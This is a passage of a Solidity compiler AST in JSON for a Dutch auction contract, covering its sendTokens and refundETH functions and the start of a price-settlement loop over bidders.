storage ref)"}},"id":1488,"indexExpression":{"id":1487,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6760:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6748:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1489,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"6763:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"6748:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"commonType":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"},"id":1492,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":1490,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6785:2:7","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"hexValue":"3138","id":1491,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6791:2:7","typeDescriptions":{"typeIdentifier":"t_rational_18_by_1","typeString":"int_const 18"},"value":"18"},"src":"6785:8:7","typeDescriptions":{"typeIdentifier":"t_rational_1000000000000000000_by_1","typeString":"int_const 1000000000000000000"}},"src":"6748:45:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":1475,"name":"DAToken","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1034,"src":"6621:7:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"id":1477,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"6629:12:7","memberName":"transferFrom","nodeType":"MemberAccess","referencedDeclaration":482,"src":"6621:20:7","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$","typeString":"function (address,address,uint256) external returns (bool)"}},"id":1494,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6621:190:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1495,"nodeType":"ExpressionStatement","src":"6621:190:7"},{"eventCall":{"arguments":[{"expression":{"baseExpression":{"id":1497,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"6870:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1499,"indexExpression":{"id":1498,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6882:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6870:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1500,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"6885:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"6870:28:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"baseExpression":{"id":1501,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"6920:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1503,"indexExpression":{"id":1502,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6932:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"6920:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1504,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"6935:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"6920:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1496,"name":"sendTokenEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1179,"src":"6834:14:7","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,uint256)"}},"id":1505,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6834:138:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1506,"nodeType":"EmitStatement","src":"6829:143:7"}]}}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1448,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1446,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6351:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":1447,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"6355:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6351:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1510,"initializationExpression":{"assignments":[1443],"declarations":[{"constant":false,"id":1443,"mutability":"mutable","name":"i","nameLocation":"6344:1:7","nodeType":"VariableDeclaration","scope":1510,"src":"6339:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1442,"name":"uint","nodeType":"ElementaryTypeName","src":"6339:4:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1445,"initialValue":{"hexValue":"30","id":1444,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6348:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"6339:10:7"},"loopExpression":{"expression":{"id":1450,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"6372:3:7","subExpression":{"id":1449,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1443,"src":"6372:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1451,"nodeType":"ExpressionStatement","src":"6372:3:7"},"nodeType":"ForStatement","src":"6334:663:7"}]},"functionSelector":"e47112bd","id":1512,"implemented":true,"kind":"function","modifiers":[],"name":"sendTokens","nameLocation":"6304:10:7","nodeType":"FunctionDefinition","parameters":{"id":1440,"nodeType":"ParameterList","parameters":[],"src":"6314:2:7"},"returnParameters":{"id":1441,"nodeType":"ParameterList","parameters":[],"src":"6324:0:7"},"scope":1950,"src":"6295:708:7","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":1588,"nodeType":"Block","src":"7036:809:7","statements":[{"body":{"id":1586,"nodeType":"Block","src":"7089:750:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1549,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1541,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1530,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1525,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"7124:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1527,"indexExpression":{"id":1526,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7136:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"7124:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1528,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"7139:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"7124:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1529,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7151:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"7124:28:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1540,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":1533,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"7180:4:7","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}],"id":1532,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7172:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1531,"name":"address","nodeType":"ElementaryTypeName","src":"7172:7:7","typeDescriptions":{}}},"id":1534,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7172:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1535,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"7186:7:7","memberName":"balance","nodeType":"MemberAccess","src":"7172:21:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"baseExpression":{"id":1536,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"7196:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1538,"indexExpression":{"id":1537,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7208:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"7196:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1539,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"7211:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"7196:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7172:48:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"7124:96:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1548,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":1544,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"7232:4:7","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}],"id":1543,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7224:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1542,"name":"address","nodeType":"ElementaryTypeName","src":"7224:7:7","typeDescriptions":{}}},"id":1545,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7224:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1546,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"7238:7:7","memberName":"balance","nodeType":"MemberAccess","src":"7224:21:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1547,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7248:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"7224:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"7124:125:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1585,"nodeType":"IfStatement","src":"7103:726:7","trueBody":{"id":1584,"nodeType":"Block","src":"7264:565:7","statements":[{"assignments":[1551],"declarations":[{"constant":false,"id":1551,"mutability":"mutable","name":"sendValue","nameLocation":"7318:9:7","nodeType":"VariableDeclaration","scope":1584,"src":"7310:17:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1550,"name":"uint256","nodeType":"ElementaryTypeName","src":"7310:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1556,"initialValue":{"expression":{"baseExpression":{"id":1552,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"7330:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1554,"indexExpression":{"id":1553,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7342:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"7330:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1555,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"7345:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"7330:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"7310:44:7"},{"assignments":[1558,null],"declarations":[{"constant":false,"id":1558,"mutability":"mutable","name":"callSuccess","nameLocation":"7459:11:7","nodeType":"VariableDeclaration","scope":1584,"src":"7454:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1557,"name":"bool","nodeType":"ElementaryTypeName","src":"7454:4:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},null],"id":1571,"initialValue":{"arguments":[{"hexValue":"","id":1569,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"7558:2:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""}],"expression":{"arguments":[{"expression":{"baseExpression":{"id":1561,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"7484:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1563,"indexExpression":{"id":1562,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7496:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"7484:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1564,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"7499:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"7484:28:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":1560,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7476:8:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_payable_$","typeString":"type(address payable)"},"typeName":{"id":1559,"name":"address","nodeType":"ElementaryTypeName","src":"7476:8:7","stateMutability":"payable","typeDescriptions":{}}},"id":1565,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7476:37:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"}},"id":1566,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"7535:4:7","memberName":"call","nodeType":"MemberAccess","src":"7476:63:7","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":1568,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"names":["value"],"nodeType":"FunctionCallOptions","options":[{"id":1567,"name":"sendValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1551,"src":"7547:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"src":"7476:81:7","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":1570,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7476:85:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"7453:108:7"},{"eventCall":{"arguments":[{"expression":{"baseExpression":{"id":1573,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"7681:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1575,"indexExpression":{"id":1574,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7693:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"7681:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1576,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"7696:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"7681:28:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"baseExpression":{"id":1577,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"7731:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1579,"indexExpression":{"id":1578,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7743:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"7731:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1580,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"7746:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"7731:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1581,"name":"sendValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1551,"src":"7787:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1572,"name":"RefundEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1195,"src":"7648:11:7","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,uint256,uint256)"}},"id":1582,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7648:166:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1583,"nodeType":"EmitStatement","src":"7643:171:7"}]}}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1521,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1519,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7063:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":1520,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"7067:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"7063:19:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1587,"initializationExpression":{"assignments":[1516],"declarations":[{"constant":false,"id":1516,"mutability":"mutable","name":"i","nameLocation":"7056:1:7","nodeType":"VariableDeclaration","scope":1587,"src":"7051:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1515,"name":"uint","nodeType":"ElementaryTypeName","src":"7051:4:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1518,"initialValue":{"hexValue":"30","id":1517,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7060:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"7051:10:7"},"loopExpression":{"expression":{"id":1523,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"7084:3:7","subExpression":{"id":1522,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1516,"src":"7084:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1524,"nodeType":"ExpressionStatement","src":"7084:3:7"},"nodeType":"ForStatement","src":"7046:793:7"}]},"functionSelector":"12210e8a","id":1589,"implemented":true,"kind":"function","modifiers":[],"name":"refundETH","nameLocation":"7018:9:7","nodeType":"FunctionDefinition","parameters":{"id":1513,"nodeType":"ParameterList","parameters":[],"src":"7027:2:7"},"returnParameters":{"id":1514,"nodeType":"ParameterList","parameters":[],"src":"7036:0:7"},"scope":1950,"src":"7009:836:7","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":1766,"nodeType":"Block","src":"7879:1953:7","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":1592,"name":"updateCurrentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1439,"src":"7889:18:7","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":1593,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7889:20:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1594,"nodeType":"ExpressionStatement","src":"7889:20:7"},{"assignments":[1596],"declarations":[{"constant":false,"id":1596,"mutability":"mutable","name":"currentAlgos","nameLocation":"7927:12:7","nodeType":"VariableDeclaration","scope":1766,"src":"7919:20:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1595,"name":"uint256","nodeType":"ElementaryTypeName","src":"7919:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1598,"initialValue":{"id":1597,"name":"totalAlgosAvailable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1019,"src":"7942:19:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"7919:42:7"},{"body":{"id":1741,"nodeType":"Block","src":"8014:1585:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1619,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1609,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"8116:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1618,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1610,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8132:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1612,"indexExpression":{"id":1611,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8144:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8132:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage 